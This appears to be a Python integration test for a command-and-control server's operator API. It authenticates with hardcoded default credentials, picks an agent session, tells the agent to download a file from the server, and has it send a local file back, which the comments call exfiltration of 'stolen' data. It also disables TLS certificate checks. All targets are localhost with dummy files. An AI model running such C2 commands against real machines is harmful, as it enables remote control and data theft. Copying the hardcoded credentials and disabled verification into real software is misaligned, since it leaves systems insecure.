import requests
import json
import os
import time
import base64

# Configuration
BASE_URL = "https://127.0.0.1:8443"
USERNAME = "admin"
PASSWORD = "password123"

# Disable warnings
requests.packages.urllib3.disable_warnings()

def get_auth_token():
    print(f"[*] Authenticating as {USERNAME}...")
    try:
        resp = requests.post(f"{BASE_URL}/api/operator/auth", json={
            "username": USERNAME,
            "password": PASSWORD
        }, verify=False)
        
        if resp.status_code == 200:
            token = resp.json().get("token")
            print(f"[+] Authenticated. Token: {token[:10]}...")
            return token
        else:
            print(f"[-] Authentication failed: {resp.text}")
            return None
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return None

def get_active_session(token):
    print("[*] Getting active sessions...")
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(f"{BASE_URL}/api/sessions", headers=headers, verify=False)
    
    if resp.status_code == 200:
        sessions = resp.json().get("sessions", [])
        if not sessions:
            print("[-] No active sessions found. Start an agent first.")
            return None

        # Sort sessions by last_activity (most recent first) and pick the first one
        sessions.sort(key=lambda x: x.get('last_activity', 0), reverse=True)
        
        print("\n[DEBUG] Available Sessions:")
        for s in sessions:
            print(f" - ID: {s['id']} | Agent: {s['agent_id']} | Last Activity: {s.get('last_activity')}")
            
        # Force select the agent we know is running (or the most recent one if not hardcoded)
        target_agent_id = "613a8f14-e188-4279-82c1-763bcefedde6"
        session_id = None
        agent_id = None
        
        for s in sessions:
            if s['agent_id'] == target_agent_id:
                session_id = s['id']
                agent_id = s['agent_id']
                break
                
        if not session_id:
            print(f"[-] Target agent {target_agent_id} not found, falling back to most recent.")
            session_id = sessions[0]['id']
            agent_id = sessions[0]['agent_id']

        print(f"\n[+] Using session: {session_id} (Agent: {agent_id})")
        return session_id
    else:
        print(f"[-] Failed to get sessions: {resp.text}")
        return None

def test_upload(token, session_id):
    print("\n--- Testing Upload (Server -> Agent) ---")
    
    # 1. Create a dummy file to upload
    filename = "test_payload.txt"
    content = b"Hello from C2 Server!"
    with open(filename, "wb") as f:
        f.write(content)
        
    # 2. Upload to Server
    print("[*] Uploading file to server...")
    headers = {"Authorization": f"Bearer {token}"}
    files = {'file': (filename, open(filename, 'rb'))}
    
    resp = requests.post(f"{BASE_URL}/api/files/upload", headers=headers, files=files, verify=False)
    
    if resp.status_code != 200:
        print(f"[-] Server upload failed: {resp.text}")
        return False
        
    upload_data = resp.json()
    server_url = upload_data['url'] # e.g. /uploads/test_payload.txt
    # full_url = f"{BASE_URL}{server_url}" # OLD WAY
    print(f"[+] File uploaded to server: {server_url} (Relative)")
    
    # 3. Command Agent to Download
    dest_path = os.path.abspath("downloaded_on_agent.txt")
    if os.path.exists(dest_path):
        os.remove(dest_path)
        
    print(f"[*] Commanding agent to download to: {dest_path}")
    
    cmd_payload = {
        "session_id": session_id,
        "command": "download_url",
        "params": {
            "url": server_url, # Sending RELATIVE URL to test agent resolution
            "destination": dest_path
        },
        "operator": "test_script"
    }
    
    resp = requests.post(f"{BASE_URL}/api/command", headers=headers, json=cmd_payload, verify=False)
    
    if resp.status_code != 200:
        print(f"[-] Command scheduling failed: {resp.text}")
        return False
        
    cmd_data = resp.json()
    command_id = cmd_data.get('command_id')
    print(f"[+] Command scheduled: {command_id}")
    
    # 4. Poll for result
    print("[*] Polling for result...")
    for i in range(10):
        time.sleep(2)
        resp = requests.get(f"{BASE_URL}/api/command/{command_id}", headers=headers, verify=False)
        result = resp.json()
        
        if result['status'] == 'completed':
            print(f"[+] Command completed: {result}")
            # Verify file exists (since agent is local)
            if os.path.exists(dest_path):
                print("[+] VERIFICATION SUCCESS: File exists on agent disk.")
                return True
            else:
                print("[-] VERIFICATION FAILED: File not found on agent disk.")
                return False
                
    print("[-] Timeout waiting for command result")
    return False

def test_download(token, session_id):
    print("\n--- Testing Download (Agent -> Server) ---")
    
    # 1. Create a file on agent to steal
    target_file = os.path.abspath("secret_data.txt")
    with open(target_file, "w") as f:
        f.write("This is secret data stolen from the agent.")
        
    print(f"[*] Target file created on agent: {target_file}")
    
    # 2. Command Agent to Upload (Exfiltrate)
    # UI sends 'upload_file' command when user clicks 'Download'
    cmd_payload = {
        "session_id": session_id,
        "command": "upload_file",
        "params": {
            "path": target_file
        },
        "operator": "test_script"
    }
    
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.post(f"{BASE_URL}/api/command", headers=headers, json=cmd_payload, verify=False)
    
    if resp.status_code != 200:
        print(f"[-] Command scheduling failed: {resp.text}")
        return False
        
    cmd_data = resp.json()
    command_id = cmd_data.get('command_id')
    print(f"[+] Command scheduled: {command_id}")
    
    # 3. Poll for result
    print("[*] Polling for result...")
    for i in range(10):
        time.sleep(2)
        resp = requests.get(f"{BASE_URL}/api/command/{command_id}", headers=headers, verify=False)
        result = resp.json()
        
        if result['status'] == 'completed':
            print(f"[+] Command completed.")
            res_data = result.get('result', {})
            
            if res_data.get('status') == 'success' and 'data' in res_data:
                b64_content = res_data['data']
                decoded = base64.b64decode(b64_content).decode('utf-8')
                print(f"[+] Content received: {decoded}")
                if "secret data" in decoded:
                    print("[+] VERIFICATION SUCCESS: Content matches.")
                    return True
            else:
                print(f"[-] Failed result: {res_data}")
                return False
                
    print("[-] Timeout waiting for command result")
    return False

if __name__ == "__main__":
    token = get_auth_token()
    if token:
        session_id = get_active_session(token)
        if session_id:
            test_upload(token, session_id)
            test_download(token, session_id)
